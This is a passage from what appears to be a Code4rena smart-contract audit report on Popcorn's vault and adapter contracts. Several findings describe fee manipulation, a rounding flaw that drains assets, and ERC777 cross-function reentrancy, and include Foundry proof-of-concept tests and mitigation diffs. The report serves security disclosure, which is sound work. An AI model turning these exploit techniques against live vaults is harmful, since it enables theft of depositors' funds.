The `feesUpdatedAt` variable is first assigned at block.timestamp when the vault is initialized: <br><https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L87>

The vault could be deployed and initialized without any asset under management at time T. For example 10 years after deployment, a user Alice deposits 100ETH into the vault, the management fee will be calculated from T to block.timestamp (which is 10 years) which is not fair. Alice will be charged immediately all majority of 100ETH as management fee. Further than that, if the totalAssets after a year is significant large, the management fee will be highly overcharged for the last year when no fund was managed.

The vault owner could create vaults, wait for a period of time and trap user to deposit. He then could immediately get user assets by claim the wrongful management fee.

### Proof of Concept

<!-- Put the POC in: test/vault/Vault.t.sol -->

    function test__managementFeeOvercharge() public {
        // Set fee
        _setFees(0, 0, 1e17, 0);

        // 10 years passed
        uint256 timestamp = block.timestamp + 315576000; // 10 years
        vm.warp(timestamp);

        // Alice deposit 100 ether to the vault
        uint256 depositAmount = 100 ether;
        asset.mint(alice, depositAmount);
        vm.startPrank(alice);
        asset.approve(address(vault), depositAmount);
        vault.deposit(depositAmount, alice);
        vm.stopPrank();

        // 1 second pass
        uint256 timestamp1 = block.timestamp + 1;
        vm.warp(timestamp1);

        uint256 expectedFeeInAsset = vault.accruedManagementFee();
        uint256 expectedFeeInShares = vault.convertToShares(expectedFeeInAsset);
        
        // Vault creator call takeManagementAndPerformanceFees to take the management fee
        vault.takeManagementAndPerformanceFees();
        console.log("Total Supply: ", vault.totalSupply());
        console.log("Balance of feeRecipient: ", vault.balanceOf(feeRecipient));

        
        assertEq(vault.totalSupply(), depositAmount + expectedFeeInShares);
        assertEq(vault.balanceOf(feeRecipient), expectedFeeInShares);

        // FeeReccipient withdraw the tokens
        vm.startPrank(feeRecipient);
        vault.redeem(vault.balanceOf(feeRecipient), feeRecipient, feeRecipient);
        // 50 ETH is withdrawn to feeRecipient
        console.log("Asset balance of feeRecipient: ", asset.balanceOf(feeRecipient));
        console.log("Vault total assets: ", vault.totalAssets());
    }

### Impact 2

Management Fee is subject to manipulation because of `feesUpdatedAt` and `totalAssets` are varied by user or vault owner's actions.

To get the management fee will be lower.

*   A user who wants to deposit large amount of assets to the vault, he will tend to call `takeManagementAndPerformanceFees` to reset the variable `feesUpdatedAt` to block.timestamp before deposit.

<https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L473>

*   A user who want to withdraw will withdraw before the call of `takeManagementAndPerformanceFees` function.

Vault owner will have the incentive to front run a large withdraw of assets and call `takeManagementAndPerformanceFees` to get higher management fee because `totalAssets()` is still high.

### Proof of Concept

Alice deposits 1000 ETH into the vault. The vault deposit, withdraw and management fees are set to 1e17.

In the first scenario, before Alice can withdraw, vault creator front-run to call the ` takeManagementAndPerformanceFees  ` function. Result is that feeReceipient will have 192.21 ETH.

<!-- Put the POC in: test/vault/Vault.t.sol -->

    function test__managementFeeFrontRun() public {
        _setFees(1e17, 1e17, 1e17, 0);

        // Alice deposit 1000 ether to the vault
        uint256 depositAmount = 1000 ether;
        asset.mint(alice, depositAmount);
        vm.startPrank(alice);
        asset.approve(address(vault), depositAmount);
        vault.deposit(depositAmount, alice);
        vm.stopPrank();

        // 7 days pass and Alice want to withdraw her ETH from vault
        uint256 timestamp = block.timestamp + 604800;
        vm.warp(timestamp);

        // Vault creator call takeManagementAndPerformanceFees to take the management fee 
        vault.takeManagementAndPerformanceFees();

        // Alice withdraw her ETH
        vm.startPrank(alice);
        vault.redeem(vault.balanceOf(alice), alice, alice);

        uint256 feeInAssetIfFrontRun = vault.convertToAssets(vault.balanceOf(feeRecipient));
        console.log("feeInAssetIfFrontRun: ", feeInAssetIfFrontRun); // feeReceipient will have 192.21 ETH
    }

In the second scenario, no front-run to call the ` takeManagementAndPerformanceFees  ` function happens. Result is that feeReceipient will have 190 ETH.

<!-- Put the POC in: test/vault/Vault.t.sol -->

    function test__managementFeeNoFrontRun() public {
        _setFees(1e17, 1e17, 1e17, 0);

        // Alice deposit 1000 ether to the vault
        uint256 depositAmount = 1000 ether;
        asset.mint(alice, depositAmount);
        vm.startPrank(alice);
        asset.approve(address(vault), depositAmount);
        vault.deposit(depositAmount, alice);
        vm.stopPrank();

        // 7 days pass and Alice want to withdraw her ETH from vault
        uint256 timestamp = block.timestamp + 604800;
        vm.warp(timestamp);

        // Alice withdraw her ETH
        vm.startPrank(alice);
        vault.redeem(vault.balanceOf(alice), alice, alice);

        // Vault creator call takeManagementAndPerformanceFees to take the management fee 
        vault.takeManagementAndPerformanceFees();

        uint256 feeInAssetIfNoFrontRun = vault.convertToAssets(vault.balanceOf(feeRecipient));
        console.log("feeInAssetIfNoFrontRun: ", feeInAssetIfNoFrontRun); // feeReceipient will have 190 ETH
    }


### Recommended Mitigation Steps:

`feesUpdatedAt` variable is not updated frequently enough. They are only updated when calling `takeManagementAndPerformanceFees` and `changeAdapter`.

The fee should be calculated and took more frequently in each deposit and withdrawal of assets.

## [[M-16] The calculation of ````takeFees```` in ````Vault```` contract is incorrect](https://github.com/code-423n4/2023-01-popcorn-findings/issues/491)
*Submitted by [KingNFT](https://github.com/code-423n4/2023-01-popcorn-findings/issues/491), also found by [immeas](https://github.com/code-423n4/2023-01-popcorn-findings/issues/784) and [bin2chen](https://github.com/code-423n4/2023-01-popcorn-findings/issues/606)*

The calculation of `takeFees` in `Vault` contract is incorrect, which will cause fee charged less than expected.

<https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L480-L494>

### Proof of Concept

To simplify the problem, let's given the fee parameters are as follows:

```solidity
// Fees are set in 1e18 for 100% (1 BPS = 1e14)
struct VaultFees {
    uint64 deposit; // 0
    uint64 withdrawal; // 0
    uint64 management; // 0.5e18 = 50%
    uint64 performance; // 0
}
```

And the initial asset token and share tokens in the vault are:

```solidity
totalAsset = 100 $AST
totalShare = 100 $SHR
yieldEarnings = 0 $AST
```

The yield earnings is also set to 0.

As the yearly management fee is 50%, so the expected fee for one year is:

```solidity
feeInAsset = 100 $AST * 0.5 = 50 $AST
```

Now let's calculate the actual fee.
The implementation of `accruedManagementFee()` is

```solidity
    function accruedManagementFee() public view returns (uint256) {
        uint256 managementFee = fees.management;
        return
            managementFee > 0
                ? managementFee.mulDiv(
                    totalAssets() * (block.timestamp - feesUpdatedAt),
                    SECONDS_PER_YEAR,
                    Math.Rounding.Down
                ) / 1e18
                : 0;
    }
```

So in this case, one year later, the calculation of first step for ` managementFee  ` will be

```solidity
managementFee = 0.5e18 * 100 $AST  * SECONDS_PER_YEAR / SECONDS_PER_YEAR  / 1e18 = 50 $AST
```

The implementation of `takeFees()` is

```solidity
    modifier takeFees() {
        uint256 managementFee = accruedManagementFee();
        uint256 totalFee = managementFee + accruedPerformanceFee();
        uint256 currentAssets = totalAssets();
        uint256 shareValue = convertToAssets(1e18);

        if (shareValue > highWaterMark) highWaterMark = shareValue;

        if (managementFee > 0) feesUpdatedAt = block.timestamp;

        if (totalFee > 0 && currentAssets > 0)
            _mint(feeRecipient, convertToShares(totalFee)); // @audit L491

        _;
    }
```

So, variables before L491 of `takeFees()` will be

```solidity
managementFee = 50 $AST
totalFee  = 50 $AST + 0 = 50 $AST
currentAssets  = 100 $AST
```

As the implementation of `convertToShares()` is

```solidity
    function convertToShares(uint256 assets) public view returns (uint256) {
        uint256 supply = totalSupply();

        return
            supply == 0
                ? assets
                : assets.mulDiv(supply, totalAssets(), Math.Rounding.Down);
    }
```

So the second parameter for `_mint()` call at L491 is

```solidity
feeInShare = convertToShares(totalFee) = convertToShares(50 $AST) = 50 $AST * 100 $SHR / 100 $AST = 50 $SHR
```

After `_mint()` at L491, the variables will be

```solidity
shareOfUser = 100 $SHR
shareOfFeeRecipient = 50 $SHR
totalShare = 100 + 50  = 150 $SHR
totalAsset = 100 $AST
```

The implementation of `convertToAssets()` is

```solidity
    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply(); 

        return
            supply == 0
                ? shares
                : shares.mulDiv(totalAssets(), supply, Math.Rounding.Down);
    }
```

Now we can get actual fee by calling `convertToAsset()`, which is

```solidity
actualFeeInAsset = convertToAsset(feeInShare) = convertToAsset(50 $SHR) = 50 $SHR * 100 $AST / 150 $SHR = 33.3 $AST
```

We can see the actual fee is less than expected, the realistic parameters will be less than the give 0.5e18, but it will be always true that the actual fee charged is not enough.

### Tools Used

VS Code

### Recommended Mitigation Steps

Use the correct formula such as:

```diff
    modifier takeFees() {
        uint256 managementFee = accruedManagementFee();
        uint256 totalFee = managementFee + accruedPerformanceFee();
        uint256 currentAssets = totalAssets();
        uint256 shareValue = convertToAssets(1e18);

        if (shareValue > highWaterMark) highWaterMark = shareValue;

        if (managementFee > 0) feesUpdatedAt = block.timestamp;

-       if (totalFee > 0 && currentAssets > 0)
-           _mint(feeRecipient, convertToShares(totalFee));
+       if (totalFee > 0 && currentAssets > 0) {
+           uint256 supply = totalSupply();
+           uint256 feeInShare = supply == 0
+               ? totalFee
+               : totalFee.mulDiv(supply, currentAssets - totalFee, Math.Rounding.Down);
+           _mint(feeRecipient, feeInShare);
+       }

        _;
    }
```

## [[M-17] Malicious Users Can Drain The Assets Of Vault. (Due to not being ERC4626 Complaint)](https://github.com/code-423n4/2023-01-popcorn-findings/issues/471)

Malicious users can drain the assets of the vault.

### Proof of Concept

The `withdraw` function users `convertToShares` to convert the assets to the amount of shares. These shares are burned from the users account and the assets are returned to the user.

The function `withdraw` is shown below:

```solidity
function withdraw(
        uint256 assets,
        address receiver,
        address owner
    ) public nonReentrant syncFeeCheckpoint returns (uint256 shares) {
        if (receiver == address(0)) revert InvalidReceiver();

        shares = convertToShares(assets);
/// .... [skipped the code]
```

The function `convertToShares` is shown below:

```solidity
function convertToShares(uint256 assets) public view returns (uint256) {
        uint256 supply = totalSupply(); // Saves an extra SLOAD if totalSupply is non-zero.

        return
            supply == 0
                ? assets
                : assets.mulDiv(supply, totalAssets(), Math.Rounding.Down);
    }
```

It uses `Math.Rounding.Down` , but it should use `Math.Rounding.Up`

Assume that the vault with the following state:

*   Total Asset = 1000 WETH
*   Total Supply = 10 shares

Assume that Alice wants to withdraw 99 WETH from the vault. Thus, she calls theÂ **`Vault.withdraw(99 WETH)`**Â function.

The calculation would go like this:

```solidity
assets = 99
return value = assets * supply / totalAssets()
return value = 99 * 10 / 1000
return value = 0
```

The value would be rounded round to zero. This will be the amount of shares burned from users account, which is zero.

Hence user can drain the assets from the vault without burning their shares.

> Note : A similar issue also exists in `mint` functionality where `Math.Rounding.Down` is used and `Math.Rounding.Up` should be used.

### Recommended Mitigation Steps

Use `Math.Rounding.Up` instead of `Math.Rounding.Down`.

As per OZ implementation here is the rounding method that should be used:

`deposit` : `convertToShares` â†’ `Math.Rounding.Down`

`mint` : `converttoAssets` â†’ `Math.Rounding.Up`

`withdraw` : `convertToShares` â†’ `Math.Rounding.Up`

`redeem` : `convertToAssets` â†’  `Math.Rounding.Down`

## [[M-18] Strategy can't earn yields for user as underlyingBalance is not updated when strategy deposits](https://github.com/code-423n4/2023-01-popcorn-findings/issues/467)
*Submitted by [rvierdiiev](https://github.com/code-423n4/2023-01-popcorn-findings/issues/467)*

<https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/adapter/abstracts/AdapterBase.sol#L456-L472>

### Impact

Strategy can't earn yields for user as underlyingBalance is not updated when strategy deposits.

### Proof of Concept

When someone deposits/withdraws from adapter, then `underlyingBalance` variable [is updated](https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/adapter/abstracts/AdapterBase.sol#L158) with deposited/withdrawn to the vault shares amount.

Only when user deposits or withdraws, then `AdapterBase` [changes totalSupply](https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/adapter/abstracts/AdapterBase.sol#L160)(it mints or burns shares).

This is how shares of users are calculated inside BeefyAdapter:

<https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/adapter/beefy/BeefyAdapter.sol#L122-L133>

```solidity
    function convertToUnderlyingShares(uint256, uint256 shares)
        public
        view
        override
        returns (uint256)
    {
        uint256 supply = totalSupply();
        return
            supply == 0
                ? shares
                : shares.mulDiv(underlyingBalance, supply, Math.Rounding.Up);
    }
```

As you can see, when user provides amount of shares that he wants to withdraw, then these shares are recalculated in order to receive shares amount inside vault. This depends on underlyingBalance and totalSupply.

Each adapter can have a strategy that can withdraw `harvest` and then redeposit it inside the vault. In this case users should earn new shares.

When adapter wants to deposit to vault it should call `strategyDeposit` function. 

<https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/adapter/abstracts/AdapterBase.sol#L456-L461>

```solidity
    function strategyDeposit(uint256 amount, uint256 shares)
        public
        onlyStrategy
    {
        _protocolDeposit(amount, shares);
    }
```

This function is just sending all amounts to the vault.

But actually it should also increase `underlyingBalance` with shares amount that it will receive by depositing.
Because this is not happening, `underlyingBalance` always equal to totalSupply and users do not earn any yields using strategy as `convertToUnderlyingShares` function will just return same value as provided shares.
So currently users can't earn any yields using strategy.

Note: this was discussed with protocol developer and he explained to me how it should work.

### Tools Used

VS Code

### Recommended Mitigation Steps

Increase `underlyingBalance` with shares amount that it will receive by depositing. But do not mint shares.

## [[M-19] Owner can collect management fees with a new increased fee for previous time period.](https://github.com/code-423n4/2023-01-popcorn-findings/issues/466)

<https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L429>

### Impact

The Owner of the contract can change the fee, and after the rage quit period it can cash those fees for the period of time where different fees were active.

This allows the Owner to collect as much management fee as it wants for an already passed time period, when it should only apply from the time it has been changed.

### Proof of Concept

This contract allows the Owner to change the fees. To do so the `proposeFees()` procedure is called. This procedure will update the proposed fees, which then can be applied by calling the `changeFees()` procedure after the rage quit period has passed (the rage quit period is a period of time that has to pass between proposing a fee and applying it).

To collect the fees, the Owner calls the procedure `takeManagementAndPerformanceFees()`. This procedure contains the modifier `takeFees()` which collects the fees.

        modifier takeFees() {
            uint256 managementFee = accruedManagementFee();
            uint256 totalFee = managementFee + accruedPerformanceFee();
            uint256 currentAssets = totalAssets();
            uint256 shareValue = convertToAssets(1e18);

            if (shareValue > highWaterMark) highWaterMark = shareValue;

            if (managementFee > 0) feesUpdatedAt = block.timestamp;

            if (totalFee > 0 && currentAssets > 0)
                _mint(feeRecipient, convertToShares(totalFee));

            _;
        }

Inside the `takeFees()` modifier the code `if (managementFee > 0) feesUpdatedAt = block.timestamp;` updates the variable `feesUpdatedAt` only if the fees are greater than 0. This variable is used as a timestamp of when was the last time fees were collected.

`managementFee` is calculated using the function `accruedManagementFees()`.

    function accruedManagementFee() public view returns (uint256) {
            uint256 managementFee = fees.management;
            return
                managementFee > 0
                    ? managementFee.mulDiv(
                        totalAssets() * (block.timestamp - feesUpdatedAt),
                        SECONDS_PER_YEAR,
                        Math.Rounding.Down
                    ) / 1e18
                    : 0;
        }

Here the `managementFee` is calculated using the `feesUpdatedAt` variable. In the calculation, the further apart the `feesUpdated` is in comparison to the `block.timestamp`, the greater the fee will be.

This `feesUpdatedAt` variable is not updated when the fee is changed using `changeFee()` or when the fees are proposed using `proposeFee()`.
This allows the owner to collect a fee for a period of time where the fee was different.

**Current behaviour:**


                           Change fee to 2
                                  |
                                  v            Collect fees with
      Fee = 0                   Fee = 2        managementFee = 2
        |                         |                    |
        v                         v                    v
      -----------------------------------------------------
        ^                         ^                    ^
        |                         |                    |
    | Day 0                     Day 5                 Day 7 |
    |                                                       |
    +-------------------------------------------------------+
                         Period of time of fees
                         collected with
                         management fee = 2

**Ideal behaviour:**


```
                            Change fee to 2
                                  |
                                  v            Collect fees with
      Fee = 0                   Fee = 2        managementFee = 2
        |                         |                    |
        v                         v                    v
      -----------------------------------------------------
        ^                         ^                    ^
        |                         |                    |
    | Day 0                     Day 5                 Day 7 |
    |                             |                         |
    +-----------------------------+-------------------------+
       Period of time of fees        Period of time of fees
       collected with                collected with
       management fee = 0            management fee = 2



```

The diagrams show how the management fees are charged for a period of time where they were not active.
The ideal behaviour diagram shows how it should behave in order to apply the management fees fairly.

**Steps:**

1.  Create vault with 0 fees
2.  Wait x amount of days
3.  Change fee to something bigger than the previous fee
4.  Collect the fees (fees collected will be from creation of vault until now with the new fee)

With these 4 steps, a Vault creator can charge a new management fee for period of time where a different fee was active.

### Tools Used

Visual Studio Code

### Recommended Mitigation Steps

The variable `feesUpdatedAt` should be updated even when the fees are 0.

Fees should be collected when a new fee is applied, therefore the time period where the former fee was current will be collected correctly and the `feesUpdatedAt` variable will be updated to the timestamp of when the new fee has been applied.

## [[M-20] erc777 cross function re-entrancy](https://github.com/code-423n4/2023-01-popcorn-findings/issues/453)
*Submitted by [0xWeiss](https://github.com/code-423n4/2023-01-popcorn-findings/issues/453)*

When an erc777 is used as asset for the vault, you can re-enter the `\_mint` function by minting the double you would have minted with a normal erc20 token.

### Vulnerability Details

The following 2 functions allow minting in the vault. One is for depositing a certain amount of assets, in this case, erc777 and getting shares in exchange, and the second one is to calculate the number of assets you have to send to mint "x" shares. The problem relies on the following lines:

deposit function:

       _mint(receiver, shares);

        asset.safeTransferFrom(msg.sender, address(this), assets);

        adapter.deposit(assets, address(this));

The erc777 has a callback to the owner of the tokens before doing transferFrom. In this case, it is a vulnerable function because it is minting the shares before we transfer the tokens. So, on the callback that transferFrom makes to our attacker contract, we directly call the other mint function that is also publicly callable by anyone. The reason why we can't re-enter the deposit is that it has a `nonReentrant` modifier, so we have to perform a cross-function re-entrancy.

mint function:

        _mint(receiver, shares);

        asset.safeTransferFrom(msg.sender, address(this), assets);

        adapter.deposit(assets, address(this));

So eventually, you will be able to get twice as many shares every time you deposit.

<https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol?plain=1#L134-L157>

### Impact

Eventually you will be able to mint twice as much as you provide assets.

### Recommended Mitigation Steps

The changes that have to be made are 2:

Either state clearly that erc777 are not supported, or

Change the flow of the function, transferring first the assets and then getting the shares.

       asset.safeTransferFrom(msg.sender, address(this), assets); //changed to the top of the function
        _mint(receiver, shares);
        adapter.deposit(assets, address(this));

## [[M-21] AdapterBase should always use delegatecall to call the functions in the strategy](https://github.com/code-423n4/2023-01-popcorn-findings/issues/435)
*Submitted by [cccz](https://github.com/code-423n4/2023-01-popcorn-findings/issues/435), also found by [bin2chen](https://github.com/code-423n4/2023-01-popcorn-findings/issues/595)*

The strategy contract will generally let the Adapter contract use delegatecall to call its functions.

So IAdapter(address(this)).call is used frequently in strategy contracts, because when the Adapter calls the strategy's functions using delegatecall, address(this) is the Adapter:

```solidity
  function harvest() public override {
    address router = abi.decode(IAdapter(address(this)).strategyConfig(), (address));
    address asset = IAdapter(address(this)).asset();
    ...
```

But in AdapterBase.\_verifyAndSetupStrategy, the verifyAdapterSelectorCompatibility/verifyAdapterCompatibility/setUp functions are not called with delegatecall, which causes the context of these functions to be the strategy contract:

```solidity
    function _verifyAndSetupStrategy(bytes4[8] memory requiredSigs) internal {
        strategy.verifyAdapterSelectorCompatibility(requiredSigs);
        strategy.verifyAdapterCompatibility(strategyConfig);
        strategy.setUp(strategyConfig);
    }
```

And since the strategy contract does not implement the interface of the Adapter contract, these functions will fail, making it impossible to create a Vault using that strategy.

```solidity
  function verifyAdapterCompatibility(bytes memory data) public override {
    address router = abi.decode(data, (address));
    address asset = IAdapter(address(this)).asset();
```

More dangerously, if functions such as setup are executed successfully because they do not call the Adapter's functions, they may later error out when calling the harvest function because the settings in setup are invalid.

### Proof of Concept

### Recommended Mitigation Steps

In `AdapterBase.\_verifyAndSetupStrategy`, the verifyAdapterSelectorCompatibility/verifyAdapterCompatibility/setUp functions are called using delegatecall.

## [[M-22] Vault fees can be set to anything when initializing](https://github.com/code-423n4/2023-01-popcorn-findings/issues/396)
*Submitted by [aashar](https://github.com/code-423n4/2023-01-popcorn-findings/issues/396), also found by [rbserver](https://github.com/code-423n4/2023-01-popcorn-findings/issues/852), [Aymen0909](https://github.com/code-423n4/2023-01-popcorn-findings/issues/849), [hashminer0725](https://github.com/code-423n4/2023-01-popcorn-findings/issues/845), [0xmuxyz](https://github.com/code-423n4/2023-01-popcorn-findings/issues/490), [7siech](https://github.com/code-423n4/2023-01-popcorn-findings/issues/253), and [supernova](https://github.com/code-423n4/2023-01-popcorn-findings/issues/198)*

The vault owner can charge any fees when initializing. Because of this a lot of problems can occur.

1.  If the fees are set at 1e18, the withdraw function won't work as it will cause division by 0 error.
2.  If all the fees are set beyond 1e18, many of the functions won't work due to arithmetic overflow.

### Proof of Concept

Below is the code where the fees can be set to anything during the initialization:

    function initialize(
            IERC20 asset_,
            IERC4626 adapter_,
            VaultFees calldata fees_,
            address feeRecipient_,
            address owner
        ) external initializer {
           //code
            fees = fees_;
          // code

Here is a test to confirm the same:

    function test_Vault_any_Fees() public{
        address vaultAddress1 = address(new Vault());
        Vault vault1;
        vault1 = Vault(vaultAddress1);
        vault1.initialize(
          IERC20(address(asset)),
          IERC4626(address(adapter)),
          VaultFees({ deposit: 2e18, withdrawal: 2e18, management: 2e18, performance: 2e18 }),
          feeRecipient,
          address(this)
        );
      }

### Tools Used

Foundry tests

### Recommended Mitigation Steps

Add a revert statement like this:

    if (
                newFees.deposit >= 1e18 ||
                newFees.withdrawal >= 1e18 ||
                newFees.management >= 1e18 ||
                newFees.performance >= 1e18

`syncFeeCheckpoint()`  does not modify the `highWaterMark` correctly, sometimes it might even decrease its value, resulting in charging more performance fees than it should.

### Proof of Concept

The `Vault.syncFeeCheckpoint()` function does not modify the `highWaterMark` correctly, sometimes it might even decrease its value, resulting in charging more performance fees than it should.  Instead of updating with a higher share values, it might actually decrease the value of `highWaterMark`. As a result, more performance fees might be charged since the `highWaterMark` was brought down again and again.

[https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#
L496-L499](https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L496-L499)

     modifier syncFeeCheckpoint() {
            _;
            highWaterMark = convertToAssets(1e18);
        }

1.  Suppose the current `highWaterMark = 2 * e18` and `convertToAssets(1e18) = 1.5 * e18`.

2.  After `deposit()` is called, since the `deposit()` function has the `synFeeCheckpoint` modifier, the `highWaterMark` will be incorrectly reset to `1.5 * e18`.

3.  Suppose after some activities, `convertToAssets(1e18) = 1.99 * e18`.

4.  `TakeFees()` is called, then the performance fee will be charged, since it wrongly decides `convertToAssets(1e18) > highWaterMark` with the wrong `highWaterMark = 1.5 * e18`. The correct `highWaterMark` should be `2 * e18`:

```javascript
 modifier takeFees() {
        uint256 managementFee = accruedManagementFee();
        uint256 totalFee = managementFee + accruedPerformanceFee();
        uint256 currentAssets = totalAssets();
        uint256 shareValue = convertToAssets(1e18);

        if (shareValue > highWaterMark) highWaterMark = shareValue;

        if (managementFee > 0) feesUpdatedAt = block.timestamp;

        if (totalFee > 0 && currentAssets > 0)
            _mint(feeRecipient, convertToShares(totalFee));

        _;
    }
function accruedPerformanceFee() public view returns (uint256) {
        uint256 highWaterMark_ = highWaterMark;
        uint256 shareValue = convertToAssets(1e18);
        uint256 performanceFee = fees.performance;

        return
            performanceFee > 0 && shareValue > highWaterMark
                ? performanceFee.mulDiv(
                    (shareValue - highWaterMark) * totalSupply(),
                    1e36,
                    Math.Rounding.Down
                )
                : 0;
    }
```

5.  As a result, the performance fee is charged when it is not supposed to do so. Investors might not be happy with this.

### Recommended Mitigation Steps

<https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L447-L460>

### Vulnerability details

This issue applies to both `AdapterBase.sol` and `Vault.sol`. For the sake of simplicity and brevity, this POC will describe just the former.

### Impact

Fee calculation is wrong and it either takes too few or too many shares than what is supposed to be when calculating the `accruedPerformanceFee` and the shares decimals are not `18`.

The former causes a loss of shares that the `FEE_RECIPIENT` should earn, but the latter causes hyperinflation, which makes users' shares worthless.

### Proof of Concept

`accruedPerformanceFee` doesn't take into consideration the shares' decimals, and it supposes that it's always `1e18`.

This is supposed to be a percentage and it's calculated as the following, rounding down.

```solidity
function accruedPerformanceFee() public view returns (uint256) {
    uint256 highWaterMark_ = highWaterMark;
    uint256 shareValue = convertToAssets(1e18);
    uint256 performanceFee_ = performanceFee;

    return
        performanceFee_ > 0 && shareValue > highWaterMark_
            ? performanceFee_.mulDiv(
                (shareValue - highWaterMark_) * totalSupply(),
                1e36,
                Math.Rounding.Down
            )
            : 0;
}
```

This calculation is wrong because the assumption is:

    totalSupply (1e18) * performanceFee_ (1e18) = 1e36

which is not always true because the `totalSupply` decimals can be greater or lesser than that.

Let's see what would happen in this case.

**Best case scenario: `supply decimals < 1e18`**

In this case, the fee calculation will always round to zero, thus the `FEE_RECIPIENT` will never get the deserved accrued fees.

**Worst case scenario: `supply decimals > 1e18`**

The `FEE_RECIPIENT` will get a highly disproportionate number of shares.

This will lead to share hyperinflation, which will also impact the users, making their shares worthless.

### Recommended Mitigation Steps

Modify the fee calculation so it's divided with the correct denominator, that takes into account the share decimals:

```solidity
performanceFee_ > 0 && shareValue > highWaterMark_
? performanceFee_.mulDiv(
    (shareValue - highWaterMark_) * totalSupply(),
    1e18 * (10 ** decimals()),
    Math.Rounding.Down
)
: 0;
``
```

<https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/adapter/abstracts/AdapterBase.sol#L232>

### Impact

AdpaterBase.harvest should be called before deposit and withdraw.

### Proof of Concept

Function `harvest` is called in order to receive yields for the adapter. It calls strategy, which handles that process. Depending on strategy it can call `strategyDeposit` function in order to [deposit earned amount](https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/adapter/abstracts/AdapterBase.sol#L456-L461) through the adaptor.

That actually means that in case if totalAssets was X before `harvest` call, then after it becomes X+Y, in case if Y yields were earned by adapter and strategy deposited it. So for the same amount of shares, user can receive bigger amount of assets.

When user deposits or withdraws, then `harvest` function [is called](https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/adapter/abstracts/AdapterBase.sol#L232), but it's called after shares amount calculation.

Because of that, in case of deposit, all previous depositors lose some part of yields as they share it with new depositor.

And in case of withdraw, user loses his yields.

### Tools Used

VS Code

### Recommended Mitigation Steps

Call `harvest` before shares amount calculation.

## [[M-26] `**Harvest()**` may not be executed when changing a **Vault** adapter](https://github.com/code-423n4/2023-01-popcorn-findings/issues/284)
*Submitted by [0xBeirao](https://github.com/code-423n4/2023-01-popcorn-findings/issues/284)*

<https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/Vault.sol#L594-L613>

### Impact

Changing the adapter (that uses a strategy) of an already credited vault can result in a loss of user funds.

### Proof of Concept

**Scenario:**

*   A **Vault** owner wants to change the underlying `**Adapter**`
*   Owner calls the `**proposeAdapter()**` and then `**changeAdapter()**` that will call the `**redeem()**` adapter function :
    *   <https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/adapter/abstracts/AdapterBase.sol#L193-L235>
*   Here the goal is to empty the **Strategy** and **Adapter** underlying contracts of the  **Vault** to make a safe adapter change.

Issue scenario **1** : the `**harvest()**` function is in cooldown.

Issue scenario **2** : the `**harvest()**` function revert.

In both cases, the `**harvest()**` function will not execute. The adapter will change without harvesting from the **Strategy** causing the loss of unclaimed rewards.

### Recommended Mitigation Steps

Change the `harvest()` function from :

```js
function harvest() public takeFees {
    if (
        address(strategy) != address(0) &&
        ((lastHarvest + harvestCooldown) < block.timestamp)
    ) {
        // solhint-disable
        address(strategy).delegatecall(
            abi.encodeWithSignature("harvest()")
        );
    }

    emit Harvested();
}
```

to :

```js
function harvest() public takeFees {
    if (
        address(strategy) == address(0) ||
        ((lastHarvest + harvestCooldown) > block.timestamp)
    ) {
        revert();  // Fixing the "Issue senario 1"
    }

    (bool success, ) = address(strategy).delegatecall(
        abi.encodeWithSignature("harvest()")
    );

    if (!success) revert(); // Fixing the "Issue senario 2"

    emit Harvested();
}
```

### Impact

When a Vault owner creates/adds a reward token to the Staking contract with faulty escrow config parameters, the reward tokens sent to the Staking contract will forever be locked up. This can happen since there are no validity checks on the values of the Escrow config for the reward tokens when adding a reward token to the Staking contract via the VaultController.

### Proof of Concept

Below are the steps to reproduce the issue:

1.  Vault Creator/Owner adds a reward token to the Staking contract of a vault they own/created, passing Escrow configuration parameters of `useEscrow` = true, `escrowDuration` = 0 and `escrowPercentage` = 1. This passes without issue since there are no validity checks for the Escrow config in the following lines:

    <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L443-L471> 

    <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L265-L271>

2.  This issue not noticeable until someone attempts to `claimRewards` for that misconfigured rewardToken from the Staking contract. This will always revert for all users trying to claim rewards for the affected rewardToken since it always attempts to lock some funds in escrow:

    <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L178-L180>

    And one of these checks in `Escrow.lock` will always fail since `escrowDuration` was set to 0 and `escrowPercentage` is so low that rewards must be so high for the escrow amount to not be 0: <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardEscrow.sol#L97-L98>

3. Reward tokens for that misconfigured rewardToken contract will now forever be locked in the Staking contract leading to loss of funds vault creator/owner.

### Tools Used

VS Code

### Recommended Mitigation Steps

1.  Add validity checks for escrowDuration and escrowPercentage before these lines: <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L265-L270>

  Make sure that `escrowDuration` is greater than 0 and that `escrowPercentage` is high enough that it won't always trigger reverts when users claim rewards.

